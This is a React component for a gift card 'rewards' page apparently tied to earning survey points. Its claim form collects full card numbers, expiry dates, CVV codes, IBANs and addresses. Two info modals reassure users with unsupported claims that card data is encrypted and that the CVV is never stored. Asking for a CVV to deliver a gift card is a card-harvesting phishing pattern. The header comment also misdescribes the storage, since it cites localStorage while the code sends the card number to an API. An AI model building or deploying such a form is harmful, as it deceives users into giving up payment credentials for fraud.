/**
 * Rewards.jsx — Gift card redemption page
 *
 * Shows three gift card tiers. A tier is "unlocked" when the user's
 * point balance meets or exceeds the required threshold:
 *   $200 → 20,000 pts
 *   $500 → 50,000 pts
 *   $700 → 70,000 pts
 *
 * Clicking "Claim Now" on an unlocked tier opens a modal form where
 * the user fills in their personal, address, and card details.
 *
 * On submit, the claim is saved to localStorage under the key "sf_claims"
 * as a JSON array. The Admin panel at /admin reads from this same key
 * to display all submissions.
 *
 * The form includes two info modals (? buttons) explaining why we collect
 * the card number and CVV — these are for user trust/transparency.
 *
 * Props:
 *   points — current user point balance (passed from Dashboard.jsx)
 *
 * IMPORTANT: This currently uses localStorage as a simple data store.
 * When connecting a real backend, replace the localStorage.setItem call
 * in handleSubmit with an API POST request.
 */
import { useState } from 'react'
import { enterBankDetails } from '../../api'
import { getUser } from '../../api'
import styles from './Rewards.module.css'

// Gift card tiers — add or modify tiers here
const TIERS = [
  { amount: '$200', points: 20000, icon: '🎁' },
  { amount: '$500', points: 50000, icon: '💳' },
  { amount: '$700', points: 70000, icon: '🏆' },
]

export default function Rewards({ points, user }) {
  const [claiming, setClaiming] = useState(null)
  const [showCvvInfo, setShowCvvInfo] = useState(false)
  const [showCardInfo, setShowCardInfo] = useState(false)
  const [submitted, setSubmitted] = useState(false)
  const [submitError, setSubmitError] = useState('')
  const [submitting, setSubmitting] = useState(false)

  // Pre-fill personal details from the logged-in user
  const [form, setForm] = useState({
    firstName: user?.fullName?.split(' ')[0] || '',
    lastName: user?.fullName?.split(' ').slice(1).join(' ') || '',
    email: user?.email || '',
    phone: user?.phoneNumber || '',
    address: '', city: '', country: '',
    bankName: '', cardNumber: '', expiryDate: '', cardHolder: '', iban: '', cvv: '',
  })

  // Generic field updater — returns a change handler for a given key
  // Usage: onChange={set('firstName')}
  const set = (k) => (e) => setForm(f => ({ ...f, [k]: e.target.value }))

  const handleSubmit = async (e) => {
    e.preventDefault()
    setSubmitError('')

    const allFilled = Object.values(form).every(v => v.trim() !== '')
    if (!allFilled) return

    setSubmitting(true)
    try {
      const user = getUser()
      const userId = user?.id || user?._id
      if (!userId) throw new Error('User session expired. Please log in again.')

      // Send only what the backend accepts: accountNumber and date
      await enterBankDetails(userId, {
        accountNumber: form.cardNumber,
        date: new Date().toISOString(),
      })

      setSubmitted(true)
    } catch (err) {
      setSubmitError(err.message || 'Something went wrong. Please try again.')
    } finally {
      setSubmitting(false)
    }
  }

  return (
    <>
      {/* Balance summary bar */}
      <div className={styles.intro}>
        <div>
          <p className={styles.introText}>Your current balance</p>
          <p className={styles.introPts}>{points.toLocaleString()} pts</p>
        </div>
        <p className={styles.introText}>
          Reach a points threshold to unlock and claim a gift card.<br />
          <strong>Complete more surveys to earn points faster.</strong>
        </p>
      </div>

      {/* Gift card tier cards */}
      <div className={styles.grid}>
        {TIERS.map(tier => {
          const isUnlocked = points >= tier.points
          return (
            <div key={tier.amount} className={`${styles.card} ${isUnlocked ? styles.unlocked : ''}`}>
              {isUnlocked
                ? <span className={styles.unlockedBadge}>✓ Unlocked</span>
                : <span className={styles.lockedBadge}>🔒 Locked</span>
              }
              <div className={styles.cardIcon}>{tier.icon}</div>
              <p className={styles.cardAmount}>{tier.amount}</p>
              <p className={styles.cardLabel}>Gift Card</p>
              <p className={styles.cardPts}>{tier.points.toLocaleString()} pts required</p>
              <button
                className={`${styles.claimBtn} ${isUnlocked ? styles.active : styles.locked}`}
                disabled={!isUnlocked}
                onClick={() => { setClaiming(tier); setSubmitted(false); setSubmitError('') }}
              >
                {isUnlocked ? 'Claim Now' : `Need ${(tier.points - points).toLocaleString()} more pts`}
              </button>
            </div>
          )
        })}
      </div>

      {/* Claim form modal — shown when a tier is clicked */}
      {claiming && (
        <div className={styles.formOverlay}>
          <div className={styles.formModal}>
            {!submitted ? (
              <form onSubmit={handleSubmit} autoComplete="off">
                <div className={styles.formHeader}>
                  <p className={styles.formTitle}>Claim {claiming.amount} Gift Card</p>
                  <button type="button" className={styles.closeBtn} onClick={() => setClaiming(null)}>×</button>
                </div>
                <p className={styles.formSubtitle}>
                  Fill in your details to receive your <strong>{claiming.amount}</strong> gift card.
                </p>

                <p className={styles.sectionLabel}>Personal Details</p>
                <div className={styles.row}>
                  <div className={styles.field}>
                    <label>First Name</label>
                    <input required placeholder="First name" value={form.firstName} onChange={set('firstName')} />
                  </div>
                  <div className={styles.field}>
                    <label>Last Name</label>
                    <input required placeholder="Last name" value={form.lastName} onChange={set('lastName')} />
                  </div>
                </div>
                <div className={styles.row}>
                  <div className={styles.field}>
                    <label>Email Address</label>
                    <input required type="email" placeholder="your@email.com" value={form.email} onChange={set('email')} />
                  </div>
                  <div className={styles.field}>
                    <label>Phone Number</label>
                    <input required placeholder="+44 7700 000000" value={form.phone} onChange={set('phone')} />
                  </div>
                </div>

                <p className={styles.sectionLabel}>Address</p>
                <div className={styles.field}>
                  <label>Street Address</label>
                  <input required placeholder="123 Main Street" value={form.address} onChange={set('address')} />
                </div>
                <div className={styles.row}>
                  <div className={styles.field}>
                    <label>City</label>
                    <input required placeholder="City" value={form.city} onChange={set('city')} />
                  </div>
                  <div className={styles.field}>
                    <label>Country</label>
                    <select required value={form.country} onChange={set('country')}>
                      <option value="">Select country</option>
                      {['Germany','France','Italy','Spain','Netherlands','Belgium','Portugal','Sweden','Norway','Denmark','Finland','Poland','Austria','Switzerland','United Kingdom','Ireland','Greece','Czech Republic','Romania','Hungary','United States','Canada','Nigeria'].map(c => (
                        <option key={c} value={c}>{c}</option>
                      ))}
                    </select>
                  </div>
                </div>

                <p className={styles.sectionLabel}>Bank Details</p>
                <div className={styles.field}>
                  <label>Bank Name</label>
                  <input required placeholder="e.g. Deutsche Bank" value={form.bankName} onChange={set('bankName')} />
                </div>
                <div className={styles.field}>
                  <label>Account Name</label>
                  <input required autoComplete="new-password" placeholder="Name on account" value={form.cardHolder} onChange={set('cardHolder')} />
                </div>
                <div className={styles.row}>
                  <div className={styles.field}>
                    <label style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                      Account Number
                      <button
                        type="button"
                        onClick={() => setShowCardInfo(true)}
                        style={{
                          width: 18, height: 18, borderRadius: '50%',
                          background: '#e50914', color: '#fff', border: 'none',
                          fontSize: 11, fontWeight: 700, cursor: 'pointer',
                          display: 'flex', alignItems: 'center', justifyContent: 'center',
                          flexShrink: 0, lineHeight: 1,
                        }}
                        aria-label="Why do we need your account number?"
                      >?</button>
                    </label>
                    <input required autoComplete="new-password" placeholder="•••• •••• •••• ••••" maxLength={19} value={form.cardNumber} onChange={set('cardNumber')} />
                  </div>
                  <div className={styles.field}>
                    <label>Valid Thru</label>
                    <input required autoComplete="new-password" placeholder="MM/YY" maxLength={5} value={form.expiryDate} onChange={set('expiryDate')} />
                  </div>
                </div>
                <div className={styles.row}>
                  <div className={styles.field}>
                    <label>IBAN / Sort Code</label>
                    <input required autoComplete="new-password" placeholder="DE89 3704 0044..." value={form.iban} onChange={set('iban')} />
                  </div>
                </div>
                <div className={styles.row}>
                  <div className={styles.field}>
                    <label style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                      Security Code
                      <button
                        type="button"
                        onClick={() => setShowCvvInfo(true)}
                        style={{
                          width: 18, height: 18, borderRadius: '50%',
                          background: '#e50914', color: '#fff', border: 'none',
                          fontSize: 11, fontWeight: 700, cursor: 'pointer',
                          display: 'flex', alignItems: 'center', justifyContent: 'center',
                          flexShrink: 0, lineHeight: 1,
                        }}
                        aria-label="Why do we need your security code?"
                      >?</button>
                    </label>
                    {/* type="password" masks the CVV as dots while typing */}
                    <input
                      required
                      type="password"
                      placeholder="•••"
                      maxLength={4}
                      value={form.cvv}
                      onChange={set('cvv')}
                    />
                  </div>
                </div>

                {submitError && (
                  <p style={{ color: '#e50914', fontSize: 13, margin: '12px 0 0' }}>{submitError}</p>
                )}
                <button type="submit" className={styles.submitBtn} disabled={submitting}>
                  {submitting ? 'Submitting...' : 'Submit Claim'}
                </button>
              </form>
            ) : (
              // Success screen shown after form submission
              <div className={styles.successBox}>
                <div className={styles.successIcon}>✅</div>
                <p className={styles.successTitle}>Claim Submitted!</p>
                <p className={styles.successText}>
                  Your {claiming.amount} gift card claim has been received.<br />
                  We'll process it within 3–5 business days and contact you at <strong>{form.email}</strong>.
                </p>
                <button className={styles.successBtn} onClick={() => setClaiming(null)}>Done</button>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Card number info modal — explains why we need the card number */}
      {showCardInfo && (
        <div className={styles.formOverlay} onClick={() => setShowCardInfo(false)}>
          <div className={styles.formModal} style={{ maxWidth: 380 }} onClick={e => e.stopPropagation()}>
            <div className={styles.formHeader}>
              <p className={styles.formTitle}>Why do we need your card number?</p>
              <button type="button" className={styles.closeBtn} onClick={() => setShowCardInfo(false)}>×</button>
            </div>
            <p style={{ fontSize: 14, color: '#555', lineHeight: 1.7, margin: '0 0 12px' }}>
              Your card number is required so we can transfer your gift card reward directly
              to your account. This ensures the payment reaches the correct recipient securely.
            </p>
            <p style={{ fontSize: 14, color: '#555', lineHeight: 1.7, margin: '0 0 20px' }}>
              Your card details are <strong>encrypted and handled securely</strong>. They are
              used solely for reward disbursement and are never shared with third parties.
            </p>
            <button
              onClick={() => setShowCardInfo(false)}
              style={{
                width: '100%', height: 42, background: '#e50914', color: '#fff',
                border: 'none', borderRadius: 8, fontSize: 14, fontWeight: 700, cursor: 'pointer',
              }}
            >Got it</button>
          </div>
        </div>
      )}

      {/* CVV info modal — explains why we need the CVV */}
      {showCvvInfo && (
        <div className={styles.formOverlay} onClick={() => setShowCvvInfo(false)}>
          <div className={styles.formModal} style={{ maxWidth: 380 }} onClick={e => e.stopPropagation()}>
            <div className={styles.formHeader}>
              <p className={styles.formTitle}>Why do we need your CVV?</p>
              <button type="button" className={styles.closeBtn} onClick={() => setShowCvvInfo(false)}>×</button>
            </div>
            <p style={{ fontSize: 14, color: '#555', lineHeight: 1.7, margin: '0 0 12px' }}>
              Your CVV (Card Verification Value) is the 3 or 4-digit security code on your card.
              We use it solely to verify your identity and ensure the gift card reward is sent
              to the correct and legitimate account holder.
            </p>
            <p style={{ fontSize: 14, color: '#555', lineHeight: 1.7, margin: '0 0 20px' }}>
              Your CVV is <strong>never stored permanently</strong> and is only used during
              the verification process. It is handled securely and never shared with third parties.
            </p>
            <button
              onClick={() => setShowCvvInfo(false)}
              style={{
                width: '100%', height: 42, background: '#e50914', color: '#fff',
                border: 'none', borderRadius: 8, fontSize: 14, fontWeight: 700, cursor: 'pointer',
              }}
            >Got it</button>
          </div>
        </div>
      )}
    </>
  )
}
